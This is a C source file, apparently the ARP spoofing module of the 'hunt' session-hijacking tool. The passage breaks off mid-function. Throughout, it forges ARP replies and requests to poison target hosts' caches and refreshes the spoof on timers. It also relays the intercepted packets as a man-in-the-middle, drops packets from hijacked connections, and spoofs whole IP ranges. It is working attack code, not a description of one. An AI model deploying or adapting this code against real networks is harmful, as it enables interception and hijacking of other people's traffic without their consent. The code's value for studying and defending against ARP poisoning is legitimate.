/*
 * 
 *	This is free software. You can redistribute it and/or modify under
 *	the terms of the GNU General Public License version 2.
 *
 * 	Copyright (C) 1998, 1999 by kra
 * 
 */
#include "hunt.h"
#include <sys/time.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <assert.h>
#include <signal.h>

struct arp_spoof_range {
	struct arp_spoof_info **asi;	/* array of pointers */
	int 		asi_count;
	unsigned int 	dst_start_addr;
	unsigned int 	dst_end_addr;
	unsigned int	src_addr;
	char 		src_fake_mac[ETH_ALEN];
	int		refresh;
	int		can_forward;
	struct arp_spoof_range *next;
};

static struct list l_arp_spoof = LIST_INIT(struct arp_spoof_info, next);
static struct list l_arp_dont_relay = LIST_INIT(struct arp_dont_relay, next);
static struct list l_arp_spoof_range = LIST_INIT(struct arp_spoof_range, next);
static struct ifunc_item ifunc_arp;

static pthread_t relay_thr;
static struct ifunc_item ifunc_relay;
static struct list l_relay_pkt = LIST_INIT(struct packet, p_next[MODULE_ARP_SPOOF]);
static int relayer_running = 0;

int arp_request_spoof_through_request = 1;
int arp_rr_count = 2;
int arp_spoof_switch = 1;
int arp_spoof_with_my_mac = 0;
int can_forward_question = 0; /* if 0 then can_forward is default to 1 */

unsigned char mac_broadcast[ETH_ALEN] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
unsigned char mac_zero[ETH_ALEN]      = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

#if 0
static unsigned char mac_test[] = {0xEA, 0x1A, 0xDE, 0xAD, 0xBE, 0xAA};

static void prepare_switch(struct arp_spoof_info *asi)
{
	struct arp_spec as_dst;
	struct timespec ts;
	int i;
	
	as_dst.src_mac = asi->src_fake_mac;
	
	as_dst.dst_mac = mac_broadcast;
	as_dst.oper = htons(ARPOP_REQUEST);	/* request is ARPOP_REQUEST */
	as_dst.sender_mac = asi->src_fake_mac;
	as_dst.sender_addr = asi->src_addr;
	as_dst.target_mac = mac_zero;
	as_dst.target_addr = htonl(ntohl(asi->dst_addr) + 1);

	for (i = 0; i < arp_rr_count; i++)
		send_arp_packet(&as_dst);
	ts.tv_sec = 0;
	ts.tv_nsec = 100000000;	/* 0.1s */
	nanosleep(&ts, NULL);
}
#endif

static void send_src_spoof_to_dst(struct arp_spoof_info *asi)
{
	struct arp_spec as_dst;
	int i;
	
	if (!asi->dst_mac_valid) {
		fprintf(stderr, "error: try to send arp spoof without known dst mac\n");
		return;
	}
	as_dst.src_mac = arp_spoof_with_my_mac ? my_eth_mac : asi->src_fake_mac;
	as_dst.dst_mac = asi->dst_mac;
	as_dst.oper = htons(ARPOP_REPLY);	/* request is ARPOP_REQUEST */
	as_dst.sender_mac = asi->src_fake_mac;
	as_dst.sender_addr = asi->src_addr;
	as_dst.target_mac = asi->dst_mac;
	as_dst.target_addr = asi->dst_addr;

	for (i = 0; i < arp_rr_count; i++)
		send_arp_packet(&as_dst);
}

/*
 * if the ARP entry is in the host arp cache the host updates it even
 * from ARP request. That means when the first spoofed host send ARP
 * request for some other machine to broadcast eth mac (with its original
 * source mac address) it is received by the second spoofed host also 
 * and that host updates the cache to the right value - so the spoof 
 * is lost - we have to handle this.
 * 
 * Don't send arp request to broadcast eth mac because then
 * you can influent all caches.
 */
static void send_src_spoof_to_dst_through_request(struct arp_spoof_info *asi, unsigned int ask_addr)
{
	struct arp_spec as_dst;
	int i;

	if (!asi->dst_mac_valid) {
		fprintf(stderr, "error: try to send arp spoof 2 without known dst mac\n");
		return;
	}
	as_dst.src_mac = arp_spoof_with_my_mac ? my_eth_mac : asi->src_fake_mac;
	as_dst.dst_mac = asi->dst_mac;	/* don't use broadcast - we want that it is received only by the target */
	as_dst.oper = htons(ARPOP_REQUEST);
	as_dst.sender_mac = asi->src_fake_mac;
	as_dst.sender_addr = asi->src_addr;
	as_dst.target_mac = mac_zero;
	as_dst.target_addr = ask_addr;
	
	for (i = 0; i < arp_rr_count; i++)
		send_arp_packet(&as_dst);
}

int arp_spoof_timejob(void *arg, int arg_sec)
{
	struct arp_spoof_info *asi = (struct arp_spoof_info *) arg;
	struct mac_info *mi_dst, *mi_src;
	
	if (!asi->dst_mac_valid) {
		if ((mi_dst = mac_info_get(asi->dst_addr))) {
			memcpy(asi->dst_mac, mi_dst->mac, ETH_ALEN);
			asi->dst_mac_valid = 1;
			mac_info_release(mi_dst);
		} else {
			mac_discover(asi->dst_addr, 1);
			/* we will find the mac next time */
		}
	}
	if (!asi->src_mac_valid) {
		if ((mi_src = mac_info_get(asi->src_addr))) {
			memcpy(asi->src_mac, mi_src->mac, ETH_ALEN);
			asi->src_mac_valid = 1;
			mac_info_release(mi_src);
		} else {
			mac_discover(asi->src_addr, 1);
			/* we will find the mac next time */
		}
	}
	if (asi->dst_mac_valid) {
		send_src_spoof_to_dst(asi);
		send_src_spoof_to_dst_through_request(asi, htonl(ntohl(asi->dst_addr) + 1));
	}
	return arg_sec;
}

#if 0
static void print_arp_request_warning(struct packet *p, struct arpeth_hdr *arpethh)
{
	printf("Warning: ARP REQEUST from %s", host_lookup(*(unsigned int *)arpethh->ar_sip, hl_mode));
	printf(" to %s with ethsrc=", host_lookup(*(unsigned int *)arpethh->ar_tip, hl_mode));
	print_eth_mac(p->p_ethh->h_source);
	printf(", ethdst=");
	print_eth_mac(p->p_ethh->h_dest);
	printf(", arpethh_sha=");
	print_eth_mac(arpethh->ar_sha);
	printf("\n");
}
#endif

/*
 * this function runs in hunt thread
 * and sends ARP respons to ARP requests which are now handled by as
 */
static void func_arp(struct packet *p, void *arg)
{
	struct list_iterator li;
	struct arphdr *arph;
	struct arpeth_hdr *arpethh;
	struct arp_spoof_info *asi;
	struct timejob *tj;
	
	arph = p->p_arph;
	arpethh = (struct arpeth_hdr *)(arph + 1);

	if (arph->ar_pro != htons(ETH_P_IP))
		return;
	/* 
	 * we want to send ARP to received request and reply packets
	 */
#if 0
	printf("recieved ARP ");
	if (arph->ar_op == htons(ARPOP_REPLY))
		printf("REPLY");
	else if (arph->ar_op == htons(ARPOP_REQUEST))
		printf("REQUEST");
	else
		printf("UNKNOWN"):
	    
	printf("for asi: %s", host_lookup(*(unsigned int *)arpethh->ar_sip, hl_mode));
	printf(" to %s with ethsrc=", host_lookup(*(unsigned int *)arpethh->ar_tip, hl_mode));
	print_eth_mac(p->p_ethh->h_source);
	printf(", ethdst=");
	print_eth_mac(p->p_ethh->h_dest);
	printf("\n");
#endif	
	list_lock(&l_arp_spoof);
	list_iter_set(&li, &l_arp_spoof);
	if (arph->ar_op == htons(ARPOP_REPLY)) { /* reply */
		while ((asi = list_iter_get(&li))) {
			if (*(unsigned int *) arpethh->ar_sip == asi->src_addr &&
			    *(unsigned int *) arpethh->ar_tip == asi->dst_addr) {
				/* learn mac addresses if we do not have them */
				if (!asi->dst_mac_valid) {
/*					printf("2 learn dst_mac\n");*/
					memcpy(asi->dst_mac, arpethh->ar_tha, ETH_ALEN);
					asi->dst_mac_valid = 1;
				}
				if (!asi->src_mac_valid) {
/*					printf("2 learn src_mac\n");*/
					memcpy(asi->src_mac, arpethh->ar_sha, ETH_ALEN);
					asi->src_mac_valid = 1;
				}
				if (asi->tj_reply) {
					unregister_timejob(asi->tj_reply);
					free(asi->tj_reply);
					asi->tj_reply = NULL;
				}
/*				printf("send spoof to reply\n");*/
				send_src_spoof_to_dst(asi);
			}
		}
	} else if (arph->ar_op == htons(ARPOP_REQUEST)) { /* request */
		/* 
		 * some host send ARP probe through REQUEST to direct MAC to see if something
		 * changed - in switched network we do not receive these requests (unless the
		 * sending host has already fake mac in its table) so the refresh feature is useful
		 */
		while ((asi = list_iter_get(&li))) {
			if (*(unsigned int *) arpethh->ar_sip == asi->dst_addr &&
			    *(unsigned int *) arpethh->ar_tip == asi->src_addr) {
			/*
			 * check if we can learn something
			 */
				if (!asi->dst_mac_valid) {
/*					printf("1 learn dst_mac\n");*/
					memcpy(asi->dst_mac, arpethh->ar_sha, ETH_ALEN);
#if 0
					if (memcmp(arpethh->ar_sha, p->p_ethh->h_source, ETH_ALEN) != 0)
						print_arp_request_warning(p, arpethh);
#endif
					asi->dst_mac_valid = 1;
				}
				if (!asi->src_mac_valid) {
					/* we cannot learn because the request is sent to broadcast mac */
					mac_discover(asi->src_addr, 1);
				}
			/*
			 * send the spoof, question is if to do so when we do not have src_mac_valid
			 */
/*				printf("1 send spoof to request\n");*/
				send_src_spoof_to_dst(asi);
				
			/*
			 * in switched environment we get the REQEUST 
			 * (as it is broadcasted) but the REPLY we don't see 
			 * - so we heve to refresh it if we don't see the REPLY
			 */
				if (asi->tj_reply) {
					unregister_timejob(asi->tj_reply);
					free(asi->tj_reply);
					asi->tj_reply = NULL;
				}
				tj = malloc(sizeof(struct timejob));
				tj->j_func = arp_spoof_timejob;
				tj->j_arg = asi;
				tj->j_arg_sec = 0;
				asi->tj_reply = tj;
				register_timejob_milsec_rel(tj, 200); /* 0.2s */
			}
			/* 
			 * the source is asking for arp resolution of some host
			 * but the spoof target could update the arp cache when
			 * it receives the request (the request is broadcasted),
			 * so we have to handle this
			 */
			if (*(unsigned int *) arpethh->ar_sip == asi->src_addr && 
			    asi->dst_mac_valid) {
				if (arp_request_spoof_through_request)
					send_src_spoof_to_dst_through_request(asi, 
						*(unsigned int *) arpethh->ar_tip);
				else
					send_src_spoof_to_dst(asi);
			}	
		}
	} else {
		/* neither REQUEST nor REPLY */
	}
	list_iter_end(&li);
	list_unlock(&l_arp_spoof);
}

/*
 * for internval use only
 */
static struct arp_spoof_info *get_asi(unsigned int src_addr, unsigned int dst_addr)
{
	struct list_iterator li;
	struct arp_spoof_info *asi, *retval;
	
	retval = NULL;
	list_iter_set(&li, &l_arp_spoof);
	while ((asi = list_iter_get(&li))) {
		if (asi->src_addr == src_addr && 
		    asi->dst_addr == dst_addr) {
			retval = asi;
			break;
		}
	}
	list_iter_end(&li);
	return retval;
}

/*
 * this function is exported to other modules like arphijack
 * it checks that we have all mac addresses ready
 */
struct arp_spoof_info *get_arp_spoof(unsigned int src_addr, unsigned int dst_addr)
{
	struct list_iterator li;
	struct arp_spoof_info *asi, *retval;
	
	retval = NULL;
	list_iter_set(&li, &l_arp_spoof);
	while ((asi = list_iter_get(&li))) {
		if (asi->src_addr == src_addr &&
		    asi->dst_addr == dst_addr &&
		    asi->src_mac_valid && asi->dst_mac_valid) {
			retval = asi;
			break;
		}
	}
	list_iter_end(&li);
	return retval;
}

struct arp_dont_relay *arp_dont_relay_insert(
			unsigned int src_addr, unsigned int dst_addr,
			unsigned int src_port, unsigned int dst_port)
{
	struct arp_dont_relay *adr;
	
	adr = malloc(sizeof(struct arp_dont_relay));
	assert(adr);
	adr->src_addr = src_addr;
	adr->dst_addr = dst_addr;
	adr->src_port = src_port;
	adr->dst_port = dst_port;
	list_push(&l_arp_dont_relay, adr);
	return adr;
}

void arp_dont_relay_remove(struct arp_dont_relay *adr)
{
	list_remove(&l_arp_dont_relay, adr);
	free(adr);
}

static void asi_want(struct arp_spoof_info *asi)
{
	pthread_mutex_lock(&asi->mutex);
	asi->lock_count++;
	pthread_mutex_unlock(&asi->mutex);
}

static void asi_release(struct arp_spoof_info *asi)
{
	pthread_mutex_lock(&asi->mutex);
	if (--(asi->lock_count) == 0)
		pthread_cond_broadcast(&asi->lock_cond);
	pthread_mutex_unlock(&asi->mutex);
}

static void asi_wait_for_release(struct arp_spoof_info *asi)
{
	pthread_mutex_lock(&asi->mutex);
	while (asi->lock_count > 0)
		pthread_cond_wait(&asi->lock_cond, &asi->mutex);
	pthread_mutex_unlock(&asi->mutex);
}

struct arp_spoof_info *start_arp_spoof(unsigned int src_addr,
				       unsigned int dst_addr,
		char *src_mac, char *dst_mac, char *src_fake_mac,
		int refresh, int can_forward, int in_range)
{
	struct arp_spoof_info *asi, *tmp;
	struct timespec ts;
	struct timejob *tj;
	struct list_iterator li;
	int i;
	
	if ((asi = get_asi(src_addr, dst_addr))) {
		if (!asi->dst_mac_valid && dst_mac) {
			memcpy(asi->dst_mac, dst_mac, ETH_ALEN);
			asi->dst_mac_valid = 1;
		}
		if (!asi->src_mac_valid && src_mac) {
			memcpy(asi->src_mac, src_mac, ETH_ALEN);
			asi->src_mac_valid = 1;
		}
		asi->use_count++;
		return asi;
	}
	if (!src_fake_mac)
		return NULL;
	
	if (list_count(&l_arp_spoof) == 0) {
		ifunc_arp.func = func_arp;
		ifunc_arp.arg = NULL;
		list_enqueue(&l_ifunc_arp, &ifunc_arp);
	}
	asi = malloc(sizeof(struct arp_spoof_info));
	assert(asi);
	memset(asi, 0, sizeof(struct arp_spoof_info));
	pthread_mutex_init(&asi->mutex, NULL);
	pthread_cond_init(&asi->lock_cond, NULL);
	asi->lock_count = 0;
	
	asi->use_count = 1;
	asi->refresh = refresh;
	asi->tj_refresh = NULL;
	asi->tj_reply = NULL;
	
	asi->src_addr = src_addr;
	asi->dst_addr = dst_addr;
	
	memcpy(asi->src_fake_mac, src_fake_mac, ETH_ALEN);
	if (dst_mac) {
		memcpy(asi->dst_mac, dst_mac, ETH_ALEN);
		asi->dst_mac_valid = 1;
	} else
		asi->dst_mac_valid = 0;
	if (src_mac) {
		memcpy(asi->src_mac, src_mac, ETH_ALEN);
		asi->src_mac_valid = 1;
	} else
		asi->src_mac_valid = 0;

	asi->can_forward = can_forward;
	asi->in_range = in_range;
	
/*	prepare_switch(asi); */
	
	if (asi->dst_mac_valid) {
		send_src_spoof_to_dst(asi);
		send_src_spoof_to_dst_through_request(asi, htonl(ntohl(dst_addr) + 1));
	
		if (arp_spoof_switch) {
			ts.tv_sec = 0;
			ts.tv_nsec = 100000000;	/* 0.1s */
			nanosleep(&ts, NULL);
			send_src_spoof_to_dst(asi);
			send_src_spoof_to_dst_through_request(asi, htonl(ntohl(dst_addr) + 1));
		}
	}
	/*
	 * insert the asi with range at the end of the l_arp_spoof list and
	 * asi without range before asi with range
	 */
	if (in_range) {
		list_enqueue(&l_arp_spoof, asi);
	} else {
		i = 0;
		list_iter_set(&li, &l_arp_spoof);
		while ((tmp = list_iter_get(&li))) {
			if (tmp->in_range)
				break;
			i++;
		}
		list_iter_end(&li);
		list_insert_at(&l_arp_spoof, i, asi);
	}
	if (refresh) {
		tj = malloc(sizeof(struct timejob));
		assert(tj);
		tj->j_func = arp_spoof_timejob;
		tj->j_arg = asi;
		tj->j_arg_sec = refresh;
		asi->tj_refresh = tj;
		register_timejob_rel(tj, refresh);
	} else
		asi->tj_refresh = NULL;
	return asi;
}

void force_arp_spoof(struct arp_spoof_info *asi, int count)
{
	int i;
	
	if (asi->dst_mac_valid) {
		for (i = 0; i < count; i++) {
			send_src_spoof_to_dst(asi);
			send_src_spoof_to_dst_through_request(asi, htonl(ntohl(asi->dst_addr) + 1));
		}
	} else
		printf("Warning: cannot try to force arp spoof while dst mac is not known\n");
}

void stop_arp_spoof(struct arp_spoof_info *asi)
{
	struct arp_spec as_dst;
	unsigned char *asi_src_mac;
	int i;
	
	if (--asi->use_count > 0)
		return;
	
	list_remove(&l_arp_spoof, asi);	/* remove asi from the list */
	
	if (asi->tj_refresh) {
		unregister_timejob(asi->tj_refresh);
		free(asi->tj_refresh);
		asi->tj_refresh = NULL;
	}
	if (asi->tj_reply) {
		unregister_timejob(asi->tj_reply);
		free(asi->tj_reply);
		asi->tj_reply = NULL;
	}
	
	if (asi->dst_mac_valid) {
		if (asi->src_mac_valid)
			asi_src_mac = asi->src_mac;
		else
			asi_src_mac = asi->src_fake_mac;
		
		if (arp_spoof_switch)
			as_dst.src_mac = arp_spoof_with_my_mac ? my_eth_mac : 
								 asi->src_fake_mac;
		else
			as_dst.src_mac = arp_spoof_with_my_mac ? my_eth_mac :
								 asi_src_mac;
		as_dst.dst_mac = asi->dst_mac;
		as_dst.oper = htons(ARPOP_REPLY);	/* request is ARPOP_REQUEST */
		as_dst.sender_mac = asi_src_mac;
		as_dst.sender_addr = asi->src_addr;
		as_dst.target_mac = asi->dst_mac;
		as_dst.target_addr = asi->dst_addr;

		for (i = 0; i < arp_rr_count; i++)
			send_arp_packet(&as_dst);

		/*
		 * ok, try request also
		 * ask the host for some fake IP
		 * but set the right mac of sender, if the sender entry is in the
		 * target host cache the host will update the cache.
		 */
		if (arp_spoof_switch)
			as_dst.src_mac = arp_spoof_with_my_mac ? my_eth_mac : 
								 asi->src_fake_mac;
		else
			as_dst.src_mac = arp_spoof_with_my_mac ? my_eth_mac : 
								 asi_src_mac;
		as_dst.src_mac = asi->src_mac;
		as_dst.dst_mac = asi->dst_mac;
		as_dst.oper = htons(ARPOP_REQUEST);
		as_dst.sender_mac = asi_src_mac;
		as_dst.sender_addr = asi->src_addr;
		as_dst.target_mac = mac_zero;
		as_dst.target_addr = htonl(ntohl(asi->dst_addr) + 1);
	
		for (i = 0; i < arp_rr_count; i++)
			send_arp_packet(&as_dst);
	}
	
	list_lock(&l_arp_spoof);
	if (list_count(&l_arp_spoof) == 0) {
		list_remove(&l_ifunc_arp, &ifunc_arp);
	}
	list_unlock(&l_arp_spoof);
	
	asi_wait_for_release(asi);
	pthread_cond_destroy(&asi->lock_cond);
	pthread_mutex_destroy(&asi->mutex);
	free(asi);
}

/*
 * this function runs in hunt thread
 * enqueues packets for relaying received from hosts which are ARP spoofed
 */
static void func_relay(struct packet *p, void *arg)
{
	struct list_iterator li;
	struct arp_spoof_info *asi;
	
	list_lock(&l_arp_spoof);
	list_iter_set(&li, &l_arp_spoof);
	while ((asi = list_iter_get(&li))) {
		/*
		 * IP packet on router looks like this:
		 * 1.    src == router/Internet, dst_addr == client
		 * 2.    src == client, dst_addr == router/Internet
		 * 
		 * ASI with dst == router, src == client should relay 1.
		 * ASI with dst == client, src == router should relay 2.
		 */
		if ((p->p_iph->saddr == asi->dst_addr || asi->can_forward) &&
		    (p->p_iph->daddr == asi->src_addr || asi->can_forward) &&
		    (!asi->dst_mac_valid || memcmp(p->p_ethh->h_source, asi->dst_mac, ETH_ALEN) == 0) &&
		    memcmp(p->p_ethh->h_dest, asi->src_fake_mac, ETH_ALEN) == 0) {
			packet_want(p);
			asi_want(asi);
			p->p_arg[MODULE_ARP_SPOOF] = asi;
			list_produce(&l_relay_pkt, p);
			break;
		}
	}
	list_iter_end(&li);
	list_unlock(&l_arp_spoof);
}

/*
 * check for packets that we do not relay - connections
 * that are for example hijacked
 */
static int check_dont_relay(struct packet *p)
{
	struct arp_dont_relay *adr;
	struct list_iterator li;
	struct iphdr *iph;
	struct tcphdr *tcph;
	int dont_relay;

	iph = p->p_iph;
	tcph = p->p_hdr.p_tcph;

	dont_relay = 0;
	list_lock(&l_arp_dont_relay);
	list_iter_set(&li, &l_arp_dont_relay);
	while ((adr = list_iter_get(&li))) {
		if (adr->src_addr == iph->saddr &&
		    adr->dst_addr == iph->daddr &&
		    adr->src_port == tcph->source &&
		    adr->dst_port == tcph->dest) {
			dont_relay = 1;
			break;
		}
		if (adr->src_addr == iph->daddr &&
		    adr->dst_addr == iph->saddr &&
		    adr->src_port == tcph->dest &&
		    adr->dst_port == tcph->source) {
			dont_relay = 1;
			break;
		}
	}
	list_iter_end(&li);
	list_unlock(&l_arp_dont_relay);	
	return dont_relay;
}

static void print_relay_packet(const char *label, struct packet *p, int print_mac)
{
#if 0
	struct iphdr *iph = p->p_iph;
	
	printf("%s: %s to ", label, host_lookup(iph->saddr, hl_mode));
	printf("%s", host_lookup(iph->daddr, hl_mode));
	if (iph->protocol == IPPROTO_TCP)
		printf(" TCP %d -> %d", ntohs(p->p_hdr.p_tcph->source),
		       ntohs(p->p_hdr.p_tcph->dest));
	else if (iph->protocol == IPPROTO_UDP)
		printf(" UDP %d -> %d", ntohs(p->p_hdr.p_udph->source),
		       ntohs(p->p_hdr.p_tcph->dest));
	else if (iph->protocol == IPPROTO_ICMP)
		printf(" ICMP");
	else
		printf(" proto %d", iph->protocol);
		
	if (print_mac) {
		printf(" ");
		print_eth_mac(p->p_ethh->h_source);
		printf("->");
		print_eth_mac(p->p_ethh->h_dest);
	}
	printf("\n");
#endif
}

/*
 * This is designed for modifing relayed packets.
 * It was used to alter packets from poor TCP/IP stack
 * implementation to correct the bug there - thanks hunt.
 */
static void relay_modify_hook(struct packet *p_new)
{
#if 0
	struct iphdr *ip;
	struct tcphdr *tcp;
	unsigned short old_check;
	
	if (p_new->p_iph->protocol == IPPROTO_TCP && 
	    p_new->p_hdr.p_tcph->ack_seq && !p_new->p_hdr.p_tcph->ack) {
			
		ip = p_new->p_iph;
		tcp = p_new->p_hdr.p_tcph;
		old_check = p_new->p_hdr.p_tcph->check;
		
		tcp->check = 0;
		tcp->check = ip_in_cksum(ip, (unsigned short *) tcp, ntohs(ip->tot_len) - IPHDR);
		if (old_check != tcp->check)
			printf("bad checksum !!!!!!!!!!!\n");
		
		p_new->p_hdr.p_tcph->ack = 1;
		tcp->check = 0;
		tcp->check = ip_in_cksum(ip, (unsigned short *) tcp, ntohs(ip->tot_len) - IPHDR);
		printf("ack flag not set - set it old=%d new=%d\n", old_check, tcp->check);
	}
#endif
}

static void *arp_relay(void *arg)
{
	struct packet *p, *p_new;
	struct arp_spoof_info *asi, *asi_dst;
	struct list_iterator li;
	struct iphdr *iph;
	struct mac_info *mi_src;
	int found = 0;
	
	pthread_sigmask(SIG_BLOCK, &intr_mask, NULL);
	setpriority(PRIO_PROCESS, getpid(), 10);
	while ((p = list_consume(&l_relay_pkt, NULL))) {
		asi = p->p_arg[MODULE_ARP_SPOOF];
		if (!asi->src_mac_valid) {
			if ((mi_src = mac_info_get(asi->src_addr))) {
				memcpy(asi->src_mac, mi_src->mac, ETH_ALEN);
				asi->src_mac_valid = 1;
				mac_info_release(mi_src);
			} else {
				/* we should limit mac_discovery packets sent from relayer */
				mac_discover(asi->src_addr, 1);
				/* we will find the mac next time */
			}
			/* we do not have destination - drop the packet */
			asi_release(asi);
			packet_free(p);
			continue;
		}
		if (!asi->dst_mac_valid) {
			memcpy(asi->dst_mac, p->p_ethh->h_source, ETH_ALEN);
			asi->dst_mac_valid = 1;
		}
		if (check_dont_relay(p)) {
			print_relay_packet("arp_realyer drop", p, 0);
			asi_release(asi);
			packet_free(p);
			continue;
		}
		/* special processing of packets */
		if (process_pktrelay(p, asi)) {
			print_relay_packet("arp_relayer pktrelay", p, 0);
			asi_release(asi);
			packet_free(p);
			continue;
		}
		p_new = packet_new();
		packet_copy_data(p_new, p);
		packet_free(p);
		p = p_new;
		iph = p->p_iph;
		
		memcpy(p->p_ethh->h_dest, asi->src_mac, ETH_ALEN);
		asi_release(asi);
		
		found = 0;
		list_iter_set(&li, &l_arp_spoof);
		while ((asi_dst = list_iter_get(&li))) {
			if (iph->saddr == asi_dst->src_addr &&
			    iph->daddr == asi_dst->dst_addr) {
				memcpy(p->p_ethh->h_source, asi_dst->src_fake_mac, ETH_ALEN);
				found = 1;
				break;
			}
		}
		list_iter_end(&li);
		if (arp_spoof_switch && ! found) {
			/* here should be some fake mac instaed of my_eth_mac
			 * - debug it in switched environment */
			memcpy(p->p_ethh->h_source, my_eth_mac, ETH_ALEN);
		}
		print_relay_packet("arp_relayer got", p, 1);
		/* modify hook - modify relayed packets if desired */
		relay_modify_hook(p_new);
		
		send_packet(p_new);
		packet_free(p_new);
	}
	return NULL;
}

static int start_arp_relayer(void)
{
	list_produce_start(&l_relay_pkt);
	if (relayer_running) {
		printf("daemon already running\n");
		return -1;
	}
	pthread_create(&relay_thr, NULL, arp_relay, NULL);
	ifunc_relay.func = func_relay;
	ifunc_relay.arg = NULL;
	list_enqueue(&l_ifunc_ip, &ifunc_relay);
	relayer_running = 1;
	printf("daemon started\n");
	return 0;	
}

static int stop_arp_relayer(void)
{
	struct packet *p;
	struct arp_spoof_info *asi;
	
	if (!relayer_running) {
		printf("daemon isn't running\n");
		return -1;
	}
	list_remove(&l_ifunc_ip, &ifunc_relay);
	/* flush packets from l_relay_pkt */
	while ((p = list_pop(&l_relay_pkt))) {
		asi = p->p_arg[MODULE_ARP_SPOOF];
		asi_release(asi);
		packet_free(p);
	}
	list_produce_done(&l_relay_pkt);
	pthread_join(relay_thr, NULL);
	relayer_running = 0;
	printf("daemon stopped\n");
	return 0;
}

void print_arp_relayer_daemon(void)
{
	if (relayer_running) {
		if (pthread_kill(relay_thr, 0) != 0) {
			pthread_join(relay_thr, NULL);
			relay_thr = (pthread_t) 0;
			relayer_running = 0;
			set_tty_color(COLOR_BRIGHTRED);
			printf("ARP relayer daemon failed - bug\n");
			set_tty_color(COLOR_LIGHTGRAY);
		} else
			printf("Y");
	}
}

/*
 * support for IP range spoof
 */
static int start_arp_spoof_range(struct arp_spoof_range *asr)
{
	struct mac_info *mi_src, *mi_dst;
	struct arp_spoof_info *asi;
	unsigned int dst_addr;
	int count = 0;
	
	if (!(mi_src = mac_info_get(asr->src_addr)))
		mac_discover(asr->src_addr, 2);
	for (dst_addr = asr->dst_start_addr; ntohl(dst_addr) <= ntohl(asr->dst_end_addr); dst_addr = htonl(ntohl(dst_addr) + 1)) {
		count++;
		if (!(mi_dst = mac_info_get(dst_addr)))
			mac_discover(dst_addr, 2);
		else
			mac_info_release(mi_dst);
	}
	sec_nanosleep(1);
	if (!mi_src)
		mi_src = mac_info_get(asr->src_addr);
	if (!mi_src) {
		if (menu_choose_yn("src mac isn't known - continue? y/n", 0) <= 0)
			return -1;
	}
	asr->asi = malloc(count * sizeof(struct arp_spoof_info *));
	asr->asi_count = 0;
	for (dst_addr = asr->dst_start_addr; ntohl(dst_addr) <= ntohl(asr->dst_end_addr); dst_addr = htonl(ntohl(dst_addr) + 1)) {
		mi_dst = mac_info_get(dst_addr);
		asi = start_arp_spoof(asr->src_addr, dst_addr,
				      mi_src ? mi_src->mac : NULL,
				      mi_dst ? mi_dst->mac : NULL,
				      asr->src_fake_mac, asr->refresh, asr->can_forward, 1);
		if (!asi)
			fprintf(stderr, "error: start_arp_spoof_range: asi == NULL\n");
		if (mi_dst)
			mac_info_release(mi_dst);
		asr->asi[asr->asi_count++] = asi;
	}
	if (mi_src)
		mac_info_release(mi_src);
	return 0;
}

static void stop_arp_spoof_range(struct arp_spoof_range *asr)
{
	int i;
	
	for (i = 0; i < asr->asi_count; i++)
		stop_arp_spoof(asr->asi[i]);
	free(asr->asi);
}

/*
 * user interface
 */
static int arp_spoof_list_items(void)
{
	struct list_iterator li;
	struct arp_spoof_info *asi;
	char buf[BUFSIZE];
	int i = 0;
	
	list_iter_set(&li, &l_arp_spoof);
	while ((asi = list_iter_get(&li))) {
		if (asi->in_range)
			break;
		sprintf_eth_mac(buf, asi->src_fake_mac);
		printf("%2d) on %-16s is %-16s as %s refresh %ds\n", i++, 
		       host_lookup(asi->dst_addr, hl_mode),
		       host_lookup(asi->src_addr, hl_mode), 
		       buf, asi->refresh);
		if (i % lines_o == 0)
			lines_o_press_key();
	}
	list_iter_end(&li);
	return i;
}

static int arp_spoof_range_list(void)
{
	struct list_iterator li;
	struct arp_spoof_range *asr;
	char buf[BUFSIZE];
	int i = 0;
	
	list_iter_set(&li, &l_arp_spoof_range);
	while ((asr = list_iter_get(&li))) {
		sprintf_eth_mac(buf, asr->src_fake_mac);
		printf("%2d) on %s - %s is %-16s as %s refresh %ds\n", i++,
		       host_lookup(asr->dst_start_addr, HL_MODE_NR),
		       host_lookup(asr->dst_end_addr, HL_MODE_NR),
		       host_lookup(asr->src_addr, hl_mode),
		       buf, asr->refresh);
		if (i % lines_o == 0)
			lines_o_press_key();
	}
	list_iter_end(&li);
	return i;
}

static void arp_spoof_add_item(void)
{
	unsigned int src_ip, dst_ip;
	unsigned char src_fake_mac[ETH_ALEN];
	struct mac_info *mi_src, *mi_dst;
	struct arp_spoof_info *asi_src_in_dst;
	char buf[BUFSIZE];
	int refresh, can_forward;
	
	if ((src_ip = menu_choose_hostname("host to spoof", NULL)) == -1)
		return;
	sprintf_eth_mac(buf, suggest_mac());
	if (menu_choose_mac("fake mac", src_fake_mac, buf) < 0)
		return;
	if (can_forward_question) {
		if ((can_forward = menu_choose_yn("is host IP router y/n", 0)) < 0)
			return;
	} else
		can_forward = 1;
	if ((dst_ip = menu_choose_hostname("target - where to insert the spoof", NULL)) == -1)
		return;
	if ((refresh = menu_choose_unr("refresh interval sec", 0, 100000, 0)) < 0)
		return;
	
	if (!(mi_src = mac_info_get(src_ip))) {
		mac_discover(src_ip, 2);
		sec_nanosleep(1);
		if (!(mi_src = mac_info_get(src_ip))) {
			if (menu_choose_yn("src mac isn't known - continue? y/n", 0) <= 0)
				return;
		}
	}
	if (!(mi_dst = mac_info_get(dst_ip))) {
		mac_discover(dst_ip, 2);
		sec_nanosleep(1);
		if (!(mi_dst = mac_info_get(dst_ip))) {
			if (menu_choose_yn("dst mac isn't known - continue? y/n", 0) <= 0) {
				if (mi_src)
					mac_info_release(mi_src);
				return;
			}
		}
	}
	asi_src_in_dst = start_arp_spoof(src_ip, dst_ip, mi_src ? mi_src->mac : NULL,
					 mi_dst ? mi_dst->mac : NULL, src_fake_mac,
					 refresh, can_forward, 0);
	if (mi_src)
		mac_info_release(mi_src);
	if (mi_dst) {
		mac_info_release(mi_dst);
		if (user_arpspoof_test(asi_src_in_dst))
			user_run_arpspoof_until_successed(asi_src_in_dst);
	}
}

static void arp_spoof_range_add(void)
{
	unsigned int src_ip, dst_start_ip, dst_end_ip;
	unsigned char src_fake_mac[ETH_ALEN];
	struct arp_spoof_range *asr;
	char buf[BUFSIZE];
	int refresh, can_forward;
	
	if ((src_ip = menu_choose_hostname("host to spoof", NULL)) == -1)
		return;
	sprintf_eth_mac(buf, suggest_mac());
	if (menu_choose_mac("fake mac", src_fake_mac, buf) < 0)
		return;
	if (can_forward_question) {
		if ((can_forward = menu_choose_yn("is host IP router y/n", 0)) < 0)
